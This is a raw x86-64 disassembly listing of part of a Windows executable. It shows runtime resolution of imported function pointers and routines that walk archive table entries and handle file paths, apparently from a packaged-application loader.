   140004a0e:	48 8d 15 43 9d 02 00 	lea    0x29d43(%rip),%rdx        # 0x14002e758
   140004a15:	e9 8f fb ff ff       	jmp    0x1400045a9
   140004a1a:	48 8d 15 6f 9d 02 00 	lea    0x29d6f(%rip),%rdx        # 0x14002e790
   140004a21:	48 8b cb             	mov    %rbx,%rcx
   140004a24:	ff 15 26 86 02 00    	call   *0x28626(%rip)        # 0x14002d050
   140004a2a:	48 89 05 bf c3 03 00 	mov    %rax,0x3c3bf(%rip)        # 0x140040df0
   140004a31:	48 85 c0             	test   %rax,%rax
   140004a34:	75 0c                	jne    0x140004a42
   140004a36:	48 8d 15 6b 9d 02 00 	lea    0x29d6b(%rip),%rdx        # 0x14002e7a8
   140004a3d:	e9 67 fb ff ff       	jmp    0x1400045a9
   140004a42:	48 8d 15 97 9d 02 00 	lea    0x29d97(%rip),%rdx        # 0x14002e7e0
   140004a49:	48 8b cb             	mov    %rbx,%rcx
   140004a4c:	ff 15 fe 85 02 00    	call   *0x285fe(%rip)        # 0x14002d050
   140004a52:	48 89 05 9f c3 03 00 	mov    %rax,0x3c39f(%rip)        # 0x140040df8
   140004a59:	48 85 c0             	test   %rax,%rax
   140004a5c:	75 0c                	jne    0x140004a6a
   140004a5e:	48 8d 15 93 9d 02 00 	lea    0x29d93(%rip),%rdx        # 0x14002e7f8
   140004a65:	e9 3f fb ff ff       	jmp    0x1400045a9
   140004a6a:	48 8d 15 bf 9d 02 00 	lea    0x29dbf(%rip),%rdx        # 0x14002e830
   140004a71:	48 8b cb             	mov    %rbx,%rcx
   140004a74:	ff 15 d6 85 02 00    	call   *0x285d6(%rip)        # 0x14002d050
   140004a7a:	48 89 05 7f c3 03 00 	mov    %rax,0x3c37f(%rip)        # 0x140040e00
   140004a81:	48 85 c0             	test   %rax,%rax
   140004a84:	75 0c                	jne    0x140004a92
   140004a86:	48 8d 15 b3 9d 02 00 	lea    0x29db3(%rip),%rdx        # 0x14002e840
   140004a8d:	e9 17 fb ff ff       	jmp    0x1400045a9
   140004a92:	48 8d 15 cf 9d 02 00 	lea    0x29dcf(%rip),%rdx        # 0x14002e868
   140004a99:	48 8b cb             	mov    %rbx,%rcx
   140004a9c:	ff 15 ae 85 02 00    	call   *0x285ae(%rip)        # 0x14002d050
   140004aa2:	48 89 05 5f c3 03 00 	mov    %rax,0x3c35f(%rip)        # 0x140040e08
   140004aa9:	48 85 c0             	test   %rax,%rax
   140004aac:	75 0c                	jne    0x140004aba
   140004aae:	48 8d 15 d3 9d 02 00 	lea    0x29dd3(%rip),%rdx        # 0x14002e888
   140004ab5:	e9 ef fa ff ff       	jmp    0x1400045a9
   140004aba:	48 8d 15 07 9e 02 00 	lea    0x29e07(%rip),%rdx        # 0x14002e8c8
   140004ac1:	48 8b cb             	mov    %rbx,%rcx
   140004ac4:	ff 15 86 85 02 00    	call   *0x28586(%rip)        # 0x14002d050
   140004aca:	48 89 05 3f c3 03 00 	mov    %rax,0x3c33f(%rip)        # 0x140040e10
   140004ad1:	48 85 c0             	test   %rax,%rax
   140004ad4:	75 0c                	jne    0x140004ae2
   140004ad6:	48 8d 15 03 9e 02 00 	lea    0x29e03(%rip),%rdx        # 0x14002e8e0
   140004add:	e9 c7 fa ff ff       	jmp    0x1400045a9
   140004ae2:	48 8d 15 2f 9e 02 00 	lea    0x29e2f(%rip),%rdx        # 0x14002e918
   140004ae9:	48 8b cb             	mov    %rbx,%rcx
   140004aec:	ff 15 5e 85 02 00    	call   *0x2855e(%rip)        # 0x14002d050
   140004af2:	48 89 05 1f c3 03 00 	mov    %rax,0x3c31f(%rip)        # 0x140040e18
   140004af9:	48 85 c0             	test   %rax,%rax
   140004afc:	75 0c                	jne    0x140004b0a
   140004afe:	48 8d 15 2b 9e 02 00 	lea    0x29e2b(%rip),%rdx        # 0x14002e930
   140004b05:	e9 9f fa ff ff       	jmp    0x1400045a9
   140004b0a:	48 8d 15 4f 9e 02 00 	lea    0x29e4f(%rip),%rdx        # 0x14002e960
   140004b11:	48 8b cb             	mov    %rbx,%rcx
   140004b14:	ff 15 36 85 02 00    	call   *0x28536(%rip)        # 0x14002d050
   140004b1a:	48 89 05 ff c2 03 00 	mov    %rax,0x3c2ff(%rip)        # 0x140040e20
   140004b21:	48 85 c0             	test   %rax,%rax
   140004b24:	75 0c                	jne    0x140004b32
   140004b26:	48 8d 15 43 9e 02 00 	lea    0x29e43(%rip),%rdx        # 0x14002e970
   140004b2d:	e9 77 fa ff ff       	jmp    0x1400045a9
   140004b32:	48 8d 15 67 9e 02 00 	lea    0x29e67(%rip),%rdx        # 0x14002e9a0
   140004b39:	48 8b cb             	mov    %rbx,%rcx
   140004b3c:	ff 15 0e 85 02 00    	call   *0x2850e(%rip)        # 0x14002d050
   140004b42:	48 89 05 df c2 03 00 	mov    %rax,0x3c2df(%rip)        # 0x140040e28
   140004b49:	48 85 c0             	test   %rax,%rax
   140004b4c:	75 0c                	jne    0x140004b5a
   140004b4e:	48 8d 15 5b 9e 02 00 	lea    0x29e5b(%rip),%rdx        # 0x14002e9b0
   140004b55:	e9 4f fa ff ff       	jmp    0x1400045a9
   140004b5a:	48 8d 15 7f 9e 02 00 	lea    0x29e7f(%rip),%rdx        # 0x14002e9e0
   140004b61:	48 8b cb             	mov    %rbx,%rcx
   140004b64:	ff 15 e6 84 02 00    	call   *0x284e6(%rip)        # 0x14002d050
   140004b6a:	48 89 05 bf c2 03 00 	mov    %rax,0x3c2bf(%rip)        # 0x140040e30
   140004b71:	48 85 c0             	test   %rax,%rax
   140004b74:	75 0c                	jne    0x140004b82
   140004b76:	48 8d 15 7b 9e 02 00 	lea    0x29e7b(%rip),%rdx        # 0x14002e9f8
   140004b7d:	e9 27 fa ff ff       	jmp    0x1400045a9
   140004b82:	48 8d 15 9f 9e 02 00 	lea    0x29e9f(%rip),%rdx        # 0x14002ea28
   140004b89:	48 8b cb             	mov    %rbx,%rcx
   140004b8c:	ff 15 be 84 02 00    	call   *0x284be(%rip)        # 0x14002d050
   140004b92:	48 89 05 9f c2 03 00 	mov    %rax,0x3c29f(%rip)        # 0x140040e38
   140004b99:	48 85 c0             	test   %rax,%rax
   140004b9c:	75 0c                	jne    0x140004baa
   140004b9e:	48 8d 15 9b 9e 02 00 	lea    0x29e9b(%rip),%rdx        # 0x14002ea40
   140004ba5:	e9 ff f9 ff ff       	jmp    0x1400045a9
   140004baa:	48 8d 15 bf 9e 02 00 	lea    0x29ebf(%rip),%rdx        # 0x14002ea70
   140004bb1:	48 8b cb             	mov    %rbx,%rcx
   140004bb4:	ff 15 96 84 02 00    	call   *0x28496(%rip)        # 0x14002d050
   140004bba:	48 89 05 7f c2 03 00 	mov    %rax,0x3c27f(%rip)        # 0x140040e40
   140004bc1:	48 85 c0             	test   %rax,%rax
   140004bc4:	75 0c                	jne    0x140004bd2
   140004bc6:	48 8d 15 c3 9e 02 00 	lea    0x29ec3(%rip),%rdx        # 0x14002ea90
   140004bcd:	e9 d7 f9 ff ff       	jmp    0x1400045a9
   140004bd2:	48 8d 15 ef 9e 02 00 	lea    0x29eef(%rip),%rdx        # 0x14002eac8
   140004bd9:	48 8b cb             	mov    %rbx,%rcx
   140004bdc:	ff 15 6e 84 02 00    	call   *0x2846e(%rip)        # 0x14002d050
   140004be2:	48 89 05 5f c2 03 00 	mov    %rax,0x3c25f(%rip)        # 0x140040e48
   140004be9:	48 85 c0             	test   %rax,%rax
   140004bec:	75 0c                	jne    0x140004bfa
   140004bee:	48 8d 15 eb 9e 02 00 	lea    0x29eeb(%rip),%rdx        # 0x14002eae0
   140004bf5:	e9 af f9 ff ff       	jmp    0x1400045a9
   140004bfa:	48 8d 15 0f 9f 02 00 	lea    0x29f0f(%rip),%rdx        # 0x14002eb10
   140004c01:	48 8b cb             	mov    %rbx,%rcx
   140004c04:	ff 15 46 84 02 00    	call   *0x28446(%rip)        # 0x14002d050
   140004c0a:	48 89 05 3f c2 03 00 	mov    %rax,0x3c23f(%rip)        # 0x140040e50
   140004c11:	48 85 c0             	test   %rax,%rax
   140004c14:	75 0c                	jne    0x140004c22
   140004c16:	48 8d 15 0b 9f 02 00 	lea    0x29f0b(%rip),%rdx        # 0x14002eb28
   140004c1d:	e9 87 f9 ff ff       	jmp    0x1400045a9
   140004c22:	48 8d 15 2f 9f 02 00 	lea    0x29f2f(%rip),%rdx        # 0x14002eb58
   140004c29:	48 8b cb             	mov    %rbx,%rcx
   140004c2c:	ff 15 1e 84 02 00    	call   *0x2841e(%rip)        # 0x14002d050
   140004c32:	48 89 05 1f c2 03 00 	mov    %rax,0x3c21f(%rip)        # 0x140040e58
   140004c39:	48 85 c0             	test   %rax,%rax
   140004c3c:	75 0c                	jne    0x140004c4a
   140004c3e:	48 8d 15 23 9f 02 00 	lea    0x29f23(%rip),%rdx        # 0x14002eb68
   140004c45:	e9 5f f9 ff ff       	jmp    0x1400045a9
   140004c4a:	48 8d 15 47 9f 02 00 	lea    0x29f47(%rip),%rdx        # 0x14002eb98
   140004c51:	48 8b cb             	mov    %rbx,%rcx
   140004c54:	ff 15 f6 83 02 00    	call   *0x283f6(%rip)        # 0x14002d050
   140004c5a:	48 89 05 ff c1 03 00 	mov    %rax,0x3c1ff(%rip)        # 0x140040e60
   140004c61:	48 85 c0             	test   %rax,%rax
   140004c64:	75 0c                	jne    0x140004c72
   140004c66:	48 8d 15 43 9f 02 00 	lea    0x29f43(%rip),%rdx        # 0x14002ebb0
   140004c6d:	e9 37 f9 ff ff       	jmp    0x1400045a9
   140004c72:	33 c0                	xor    %eax,%eax
   140004c74:	48 83 c4 20          	add    $0x20,%rsp
   140004c78:	5b                   	pop    %rbx
   140004c79:	c3                   	ret
   140004c7a:	cc                   	int3
   140004c7b:	cc                   	int3
   140004c7c:	cc                   	int3
   140004c7d:	cc                   	int3
   140004c7e:	cc                   	int3
   140004c7f:	cc                   	int3
   140004c80:	48 83 ec 28          	sub    $0x28,%rsp
   140004c84:	83 b9 78 50 00 00 01 	cmpl   $0x1,0x5078(%rcx)
   140004c8b:	75 4f                	jne    0x140004cdc
   140004c8d:	48 8b 05 9c c0 03 00 	mov    0x3c09c(%rip),%rax        # 0x140040d30
   140004c94:	ff 15 f6 86 02 00    	call   *0x286f6(%rip)        # 0x14002d390
   140004c9a:	85 c0                	test   %eax,%eax
   140004c9c:	74 3e                	je     0x140004cdc
   140004c9e:	48 8b 05 6b c1 03 00 	mov    0x3c16b(%rip),%rax        # 0x140040e10
   140004ca5:	48 8d 0d a4 a2 02 00 	lea    0x2a2a4(%rip),%rcx        # 0x14002ef50
   140004cac:	33 d2                	xor    %edx,%edx
   140004cae:	ff 15 dc 86 02 00    	call   *0x286dc(%rip)        # 0x14002d390
   140004cb4:	48 8b 05 55 c1 03 00 	mov    0x3c155(%rip),%rax        # 0x140040e10
   140004cbb:	48 8d 0d 1e a3 02 00 	lea    0x2a31e(%rip),%rcx        # 0x14002efe0
   140004cc2:	33 d2                	xor    %edx,%edx
   140004cc4:	ff 15 c6 86 02 00    	call   *0x286c6(%rip)        # 0x14002d390
   140004cca:	48 8b 05 4f c0 03 00 	mov    0x3c04f(%rip),%rax        # 0x140040d20
   140004cd1:	48 83 c4 28          	add    $0x28,%rsp
   140004cd5:	48 ff 25 b4 86 02 00 	rex.W jmp *0x286b4(%rip)        # 0x14002d390
   140004cdc:	48 83 c4 28          	add    $0x28,%rsp
   140004ce0:	c3                   	ret
   140004ce1:	cc                   	int3
   140004ce2:	cc                   	int3
   140004ce3:	cc                   	int3
   140004ce4:	cc                   	int3
   140004ce5:	cc                   	int3
   140004ce6:	cc                   	int3
   140004ce7:	cc                   	int3
   140004ce8:	cc                   	int3
   140004ce9:	cc                   	int3
   140004cea:	cc                   	int3
   140004ceb:	cc                   	int3
   140004cec:	cc                   	int3
   140004ced:	cc                   	int3
   140004cee:	cc                   	int3
   140004cef:	cc                   	int3
   140004cf0:	40 56                	rex push %rsi
   140004cf2:	48 83 ec 30          	sub    $0x30,%rsp
   140004cf6:	48 8b f1             	mov    %rcx,%rsi
   140004cf9:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   140004d00:	48 81 c1 70 40 00 00 	add    $0x4070,%rcx
   140004d07:	48 ff c2             	inc    %rdx
   140004d0a:	80 3c 11 00          	cmpb   $0x0,(%rcx,%rdx,1)
   140004d0e:	75 f7                	jne    0x140004d07
   140004d10:	48 8b 05 21 c1 03 00 	mov    0x3c121(%rip),%rax        # 0x140040e38
   140004d17:	4c 8d 0d 52 a1 02 00 	lea    0x2a152(%rip),%r9        # 0x14002ee70
   140004d1e:	4c 8d 05 53 a1 02 00 	lea    0x2a153(%rip),%r8        # 0x14002ee78
   140004d25:	ff 15 65 86 02 00    	call   *0x28665(%rip)        # 0x14002d390
   140004d2b:	48 85 c0             	test   %rax,%rax
   140004d2e:	75 17                	jne    0x140004d47
   140004d30:	48 8d 0d 49 a1 02 00 	lea    0x2a149(%rip),%rcx        # 0x14002ee80
   140004d37:	e8 c4 d2 ff ff       	call   0x140002000
   140004d3c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004d41:	48 83 c4 30          	add    $0x30,%rsp
   140004d45:	5e                   	pop    %rsi
   140004d46:	c3                   	ret
   140004d47:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140004d4c:	48 8d 0d 55 a1 02 00 	lea    0x2a155(%rip),%rcx        # 0x14002eea8
   140004d53:	48 8b d0             	mov    %rax,%rdx
   140004d56:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140004d5b:	48 8b 05 c6 c0 03 00 	mov    0x3c0c6(%rip),%rax        # 0x140040e28
   140004d62:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140004d67:	ff 15 23 86 02 00    	call   *0x28623(%rip)        # 0x14002d390
   140004d6d:	48 8b 5e 08          	mov    0x8(%rsi),%rbx
   140004d71:	48 3b 5e 10          	cmp    0x10(%rsi),%rbx
   140004d75:	0f 83 ba 00 00 00    	jae    0x140004e35
   140004d7b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d80:	0f b6 43 11          	movzbl 0x11(%rbx),%eax
   140004d84:	2c 4d                	sub    $0x4d,%al
   140004d86:	a8 df                	test   $0xdf,%al
   140004d88:	0f 85 8f 00 00 00    	jne    0x140004e1d
   140004d8e:	48 8b d3             	mov    %rbx,%rdx
   140004d91:	48 8b ce             	mov    %rsi,%rcx
   140004d94:	e8 f7 c7 ff ff       	call   0x140001590
   140004d99:	8b 53 0c             	mov    0xc(%rbx),%edx
   140004d9c:	48 8b e8             	mov    %rax,%rbp
   140004d9f:	48 8b c8             	mov    %rax,%rcx
   140004da2:	48 8b 05 1f c0 03 00 	mov    0x3c01f(%rip),%rax        # 0x140040dc8
   140004da9:	ff 15 e1 85 02 00    	call   *0x285e1(%rip)        # 0x14002d390
   140004daf:	48 85 c0             	test   %rax,%rax
   140004db2:	74 1e                	je     0x140004dd2
   140004db4:	48 8b d0             	mov    %rax,%rdx
   140004db7:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140004dbb:	48 8b 05 ee bf 03 00 	mov    0x3bfee(%rip),%rax        # 0x140040db0
   140004dc2:	ff 15 c8 85 02 00    	call   *0x285c8(%rip)        # 0x14002d390
   140004dc8:	48 8b f8             	mov    %rax,%rdi
   140004dcb:	48 85 c0             	test   %rax,%rax
   140004dce:	75 14                	jne    0x140004de4
   140004dd0:	eb 02                	jmp    0x140004dd4
   140004dd2:	33 ff                	xor    %edi,%edi
   140004dd4:	48 8d 53 12          	lea    0x12(%rbx),%rdx
   140004dd8:	48 8d 0d d9 a0 02 00 	lea    0x2a0d9(%rip),%rcx        # 0x14002eeb8
   140004ddf:	e8 1c d2 ff ff       	call   0x140002000
   140004de4:	48 8b 05 9d bf 03 00 	mov    0x3bf9d(%rip),%rax        # 0x140040d88
   140004deb:	ff 15 9f 85 02 00    	call   *0x2859f(%rip)        # 0x14002d390
   140004df1:	48 85 c0             	test   %rax,%rax
   140004df4:	74 1a                	je     0x140004e10
   140004df6:	48 8b 05 93 bf 03 00 	mov    0x3bf93(%rip),%rax        # 0x140040d90
   140004dfd:	ff 15 8d 85 02 00    	call   *0x2858d(%rip)        # 0x14002d390
   140004e03:	48 8b 05 66 bf 03 00 	mov    0x3bf66(%rip),%rax        # 0x140040d70
   140004e0a:	ff 15 80 85 02 00    	call   *0x28580(%rip)        # 0x14002d390
   140004e10:	48 8b cd             	mov    %rbp,%rcx
   140004e13:	e8 f0 0a 01 00       	call   0x140015908
   140004e18:	48 85 ff             	test   %rdi,%rdi
   140004e1b:	74 2f                	je     0x140004e4c
   140004e1d:	48 8b d3             	mov    %rbx,%rdx
   140004e20:	48 8b ce             	mov    %rsi,%rcx
   140004e23:	e8 58 cc ff ff       	call   0x140001a80
   140004e28:	48 8b d8             	mov    %rax,%rbx
   140004e2b:	48 3b 46 10          	cmp    0x10(%rsi),%rax
   140004e2f:	0f 82 4b ff ff ff    	jb     0x140004d80
   140004e35:	33 c0                	xor    %eax,%eax
   140004e37:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140004e3c:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004e41:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140004e46:	48 83 c4 30          	add    $0x30,%rsp
   140004e4a:	5e                   	pop    %rsi
   140004e4b:	c3                   	ret
   140004e4c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004e51:	eb e4                	jmp    0x140004e37
   140004e53:	cc                   	int3
   140004e54:	cc                   	int3
   140004e55:	cc                   	int3
   140004e56:	cc                   	int3
   140004e57:	cc                   	int3
   140004e58:	cc                   	int3
   140004e59:	cc                   	int3
   140004e5a:	cc                   	int3
   140004e5b:	cc                   	int3
   140004e5c:	cc                   	int3
   140004e5d:	cc                   	int3
   140004e5e:	cc                   	int3
   140004e5f:	cc                   	int3
   140004e60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004e65:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004e6a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004e6f:	57                   	push   %rdi
   140004e70:	48 83 ec 30          	sub    $0x30,%rsp
   140004e74:	48 8b 79 08          	mov    0x8(%rcx),%rdi
   140004e78:	48 8b f1             	mov    %rcx,%rsi
   140004e7b:	48 3b 79 10          	cmp    0x10(%rcx),%rdi
   140004e7f:	0f 83 c9 00 00 00    	jae    0x140004f4e
   140004e85:	80 7f 11 7a          	cmpb   $0x7a,0x11(%rdi)
   140004e89:	0f 85 a7 00 00 00    	jne    0x140004f36
   140004e8f:	8b 6f 04             	mov    0x4(%rdi),%ebp
   140004e92:	48 8d 4e 70          	lea    0x70(%rsi),%rcx
   140004e96:	48 03 2e             	add    (%rsi),%rbp
   140004e99:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   140004ea0:	48 ff c2             	inc    %rdx
   140004ea3:	80 3c 11 00          	cmpb   $0x0,(%rcx,%rdx,1)
   140004ea7:	75 f7                	jne    0x140004ea0
   140004ea9:	48 8b 05 88 bf 03 00 	mov    0x3bf88(%rip),%rax        # 0x140040e38
   140004eb0:	4c 8d 0d b9 9f 02 00 	lea    0x29fb9(%rip),%r9        # 0x14002ee70
   140004eb7:	4c 8d 05 ba 9f 02 00 	lea    0x29fba(%rip),%r8        # 0x14002ee78
   140004ebe:	ff 15 cc 84 02 00    	call   *0x284cc(%rip)        # 0x14002d390
   140004ec4:	4c 8b c5             	mov    %rbp,%r8
   140004ec7:	48 8d 0d 0a a0 02 00 	lea    0x2a00a(%rip),%rcx        # 0x14002eed8
   140004ece:	48 8b d8             	mov    %rax,%rbx
   140004ed1:	48 8b d0             	mov    %rax,%rdx
   140004ed4:	48 8b 05 6d bf 03 00 	mov    0x3bf6d(%rip),%rax        # 0x140040e48
   140004edb:	ff 15 af 84 02 00    	call   *0x284af(%rip)        # 0x14002d390
   140004ee1:	48 8b e8             	mov    %rax,%rbp
   140004ee4:	48 8b cb             	mov    %rbx,%rcx
   140004ee7:	48 8b 05 1a be 03 00 	mov    0x3be1a(%rip),%rax        # 0x140040d08
   140004eee:	ff 15 9c 84 02 00    	call   *0x2849c(%rip)        # 0x14002d390
   140004ef4:	48 8b 05 25 bf 03 00 	mov    0x3bf25(%rip),%rax        # 0x140040e20
   140004efb:	48 8d 0d de 9f 02 00 	lea    0x29fde(%rip),%rcx        # 0x14002eee0
   140004f02:	ff 15 88 84 02 00    	call   *0x28488(%rip)        # 0x14002d390
   140004f08:	48 85 c0             	test   %rax,%rax
   140004f0b:	74 58                	je     0x140004f65
   140004f0d:	48 8b c8             	mov    %rax,%rcx
   140004f10:	48 8b d5             	mov    %rbp,%rdx
   140004f13:	48 8b 05 a6 be 03 00 	mov    0x3bea6(%rip),%rax        # 0x140040dc0
   140004f1a:	ff 15 70 84 02 00    	call   *0x28470(%rip)        # 0x14002d390
   140004f20:	8b d8                	mov    %eax,%ebx
   140004f22:	85 c0                	test   %eax,%eax
   140004f24:	74 10                	je     0x140004f36
   140004f26:	48 8d 0d eb 9f 02 00 	lea    0x29feb(%rip),%rcx        # 0x14002ef18
   140004f2d:	e8 ce d0 ff ff       	call   0x140002000
   140004f32:	85 db                	test   %ebx,%ebx
   140004f34:	78 4b                	js     0x140004f81
   140004f36:	48 8b d7             	mov    %rdi,%rdx
   140004f39:	48 8b ce             	mov    %rsi,%rcx
   140004f3c:	e8 3f cb ff ff       	call   0x140001a80
   140004f41:	48 8b f8             	mov    %rax,%rdi
   140004f44:	48 3b 46 10          	cmp    0x10(%rsi),%rax
   140004f48:	0f 82 37 ff ff ff    	jb     0x140004e85
   140004f4e:	33 c0                	xor    %eax,%eax
   140004f50:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004f55:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140004f5a:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140004f5f:	48 83 c4 30          	add    $0x30,%rsp
   140004f63:	5f                   	pop    %rdi
   140004f64:	c3                   	ret
   140004f65:	48 8d 0d 7c 9f 02 00 	lea    0x29f7c(%rip),%rcx        # 0x14002eee8
   140004f6c:	e8 8f d0 ff ff       	call   0x140002000
   140004f71:	48 8b 05 90 bd 03 00 	mov    0x3bd90(%rip),%rax        # 0x140040d08
   140004f78:	48 8b cd             	mov    %rbp,%rcx
   140004f7b:	ff 15 0f 84 02 00    	call   *0x2840f(%rip)        # 0x14002d390
   140004f81:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004f86:	eb c8                	jmp    0x140004f50
   140004f88:	cc                   	int3
   140004f89:	cc                   	int3
   140004f8a:	cc                   	int3
   140004f8b:	cc                   	int3
   140004f8c:	cc                   	int3
   140004f8d:	cc                   	int3
   140004f8e:	cc                   	int3
   140004f8f:	cc                   	int3
   140004f90:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004f95:	57                   	push   %rdi
   140004f96:	b8 70 20 00 00       	mov    $0x2070,%eax
   140004f9b:	e8 a0 64 00 00       	call   0x14000b440
   140004fa0:	48 2b e0             	sub    %rax,%rsp
   140004fa3:	48 8b 05 96 b0 03 00 	mov    0x3b096(%rip),%rax        # 0x140040040
   140004faa:	48 33 c4             	xor    %rsp,%rax
   140004fad:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   140004fb4:	00 
   140004fb5:	48 8b d9             	mov    %rcx,%rbx
   140004fb8:	4c 8d 49 30          	lea    0x30(%rcx),%r9
   140004fbc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004fc1:	ba 40 00 00 00       	mov    $0x40,%edx
   140004fc6:	4c 8d 05 13 8a 02 00 	lea    0x28a13(%rip),%r8        # 0x14002d9e0
   140004fcd:	e8 0e cf ff ff       	call   0x140001ee0
   140004fd2:	48 63 d0             	movslq %eax,%rdx
   140004fd5:	48 83 fa 40          	cmp    $0x40,%rdx
   140004fd9:	72 20                	jb     0x140004ffb
   140004fdb:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   140004fe1:	4c 8d 43 30          	lea    0x30(%rbx),%r8
   140004fe5:	48 8d 0d f4 9b 02 00 	lea    0x29bf4(%rip),%rcx        # 0x14002ebe0
   140004fec:	e8 0f d0 ff ff       	call   0x140002000
   140004ff1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004ff6:	e9 d0 00 00 00       	jmp    0x1400050cb
   140004ffb:	83 bb 74 50 00 00 00 	cmpl   $0x0,0x5074(%rbx)
   140005002:	74 4e                	je     0x140005052
   140005004:	4c 8d 05 1d 9c 02 00 	lea    0x29c1d(%rip),%r8        # 0x14002ec28
   14000500b:	48 8d 93 70 30 00 00 	lea    0x3070(%rbx),%rdx
   140005012:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140005017:	e8 b4 e2 ff ff       	call   0x1400032d0
   14000501c:	48 85 c0             	test   %rax,%rax
   14000501f:	75 19                	jne    0x14000503a
   140005021:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140005027:	48 8d 93 70 30 00 00 	lea    0x3070(%rbx),%rdx
   14000502e:	48 8d 0d 03 9c 02 00 	lea    0x29c03(%rip),%rcx        # 0x14002ec38
   140005035:	e8 c6 cf ff ff       	call   0x140002000
   14000503a:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000503f:	e8 3c e1 ff ff       	call   0x140003180
   140005044:	85 c0                	test   %eax,%eax
   140005046:	74 0a                	je     0x140005052
   140005048:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000504d:	e8 de 25 00 00       	call   0x140007630
   140005052:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140005057:	48 8d 93 70 40 00 00 	lea    0x4070(%rbx),%rdx
   14000505e:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140005065:	00 
   140005066:	e8 65 e2 ff ff       	call   0x1400032d0
   14000506b:	48 85 c0             	test   %rax,%rax
   14000506e:	75 19                	jne    0x140005089
   140005070:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140005076:	48 8d 93 70 40 00 00 	lea    0x4070(%rbx),%rdx
   14000507d:	48 8d 0d f4 9b 02 00 	lea    0x29bf4(%rip),%rcx        # 0x14002ec78
   140005084:	e8 77 cf ff ff       	call   0x140002000
   140005089:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140005090:	00 
   140005091:	e8 9a 25 00 00       	call   0x140007630
   140005096:	48 85 c0             	test   %rax,%rax
   140005099:	75 22                	jne    0x1400050bd
   14000509b:	4c 8d 84 24 60 10 00 	lea    0x1060(%rsp),%r8
   1400050a2:	00 
   1400050a3:	48 8d 15 06 9c 02 00 	lea    0x29c06(%rip),%rdx        # 0x14002ecb0
   1400050aa:	48 8d 0d 1f 9c 02 00 	lea    0x29c1f(%rip),%rcx        # 0x14002ecd0
   1400050b1:	e8 aa cf ff ff       	call   0x140002060
   1400050b6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400050bb:	eb 0e                	jmp    0x1400050cb
   1400050bd:	8b 15 41 bc 03 00    	mov    0x3bc41(%rip),%edx        # 0x140040d04
   1400050c3:	48 8b c8             	mov    %rax,%rcx
   1400050c6:	e8 b5 f4 ff ff       	call   0x140004580
   1400050cb:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   1400050d2:	00 
   1400050d3:	48 33 cc             	xor    %rsp,%rcx
   1400050d6:	e8 c5 63 00 00       	call   0x14000b4a0
   1400050db:	48 8b 9c 24 88 20 00 	mov    0x2088(%rsp),%rbx
   1400050e2:	00 
   1400050e3:	48 81 c4 70 20 00 00 	add    $0x2070,%rsp
   1400050ea:	5f                   	pop    %rdi
   1400050eb:	c3                   	ret
   1400050ec:	cc                   	int3
   1400050ed:	cc                   	int3
   1400050ee:	cc                   	int3
   1400050ef:	cc                   	int3
